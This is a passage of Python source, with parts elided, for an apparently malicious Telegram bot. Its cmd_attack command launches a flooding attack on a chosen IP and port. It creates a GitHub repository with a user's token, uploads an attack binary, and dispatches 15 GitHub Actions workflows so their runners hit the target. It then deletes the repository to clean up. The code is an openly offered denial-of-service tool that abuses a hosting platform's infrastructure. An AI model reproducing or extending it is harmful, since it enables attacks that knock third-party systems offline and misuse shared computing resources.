...
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    attack_msg = await update.message.reply_text("🔥 **INITIATING INSTANT ATTACK...**")
    ...
    if valid_ngrok:
        try:
            ...
            await attack_msg.edit_text("🔗 **CREATING INSTANT TUNNEL...**")
...
"""
                ...
                await attack_msg.edit_text("⚠️ **TUNNEL CREATION FAILED - Using direct IP**")
        except Exception as e:
            await attack_msg.edit_text(f"⚠️ **TUNNEL FAILED:** {str(e)} - Using direct IP")
    
    attack_target = tunnel_url if tunnel_url else ip
    target_port = tunnel_url.split(":")[-1] if tunnel_url and ":" in tunnel_url else str(port)
    ...
    await attack_msg.edit_text("📁 **CREATING INSTANT REPOSITORY...**")
    repo_data = gh_create_repo(github_token, repo_name)
    
    if not repo_data:
        await attack_msg.edit_text("❌ **FAILED TO CREATE REPOSITORY**")
        return
    
    owner = repo_data['owner']['login']
    full_repo_name = repo_data['full_name']
    
    await attack_msg.edit_text("📦 **UPLOADING INSTANT BINARY...**")
    with open(BINARY_PATH, "rb") as f:
        binary_data = f.read()
    
    if not gh_put_file(github_token, owner, repo_name, BINARY_NAME, binary_data, "Add RAJAXFLAME binary"):
        await attack_msg.edit_text("❌ **FAILED TO UPLOAD BINARY**")
        gh_delete_repo(github_token, full_repo_name)
        return
    
    await attack_msg.edit_text("⚡ **UPLOADING INSTANT WORKFLOWS...**")
    ...
    for wf_name, wf_content in workflows.items():
        ...
        await asyncio.sleep(0.3)  # Faster upload
    
    await attack_msg.edit_text("🎯 **DEPLOYING INSTANT WORKFLOWS...**")
    ...
    for wf_name in workflows.keys():
        ...
        await asyncio.sleep(0.5)  # Faster dispatch
    ...
    total_runners = sum([3, 2, 4, 3, 2, 4, 3, 2, 4, 3, 5, 4, 6, 5, 6])  # Total from all workflows
    success_report = f"""
🎯 **INSTANT ATTACK DEPLOYED SUCCESSFULLY!**

📊 **INSTANT REPORT:**
✅ Workflows Uploaded: {successful_workflows}/15
✅ Workflows Deployed: {dispatched_workflows}/15
🚀 Total Runners: {total_runners}
🎯 Target: `{attack_target}:{target_port}`
⏱ Duration: {duration} seconds
🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}

🔰 **MODE:** {'🔥 INSTANT TUNNEL + 15x WORKFLOWS' if tunnel_url else '⚡ INSTANT DIRECT + 15x WORKFLOWS'}
📁 Repository: `{repo_name}`
🔑 Token: `{github_token[:12]}...`

💥 **INSTANT ATTACK ACTIVATED - TARGET WILL BE DESTROYED!**
    """
    ...
    asyncio.create_task(instant_cleanup(chat_id, github_token, full_repo_name, tunnel_id, duration))

async def instant_cleanup(chat_id: int, token: str, repo: str, tunnel_id: Optional[str], duration: int):
...
📈 Workflows: {status['workflows_dispatched']}/15
"""
...
"""
        ...
        # Create a new context for cmd_check
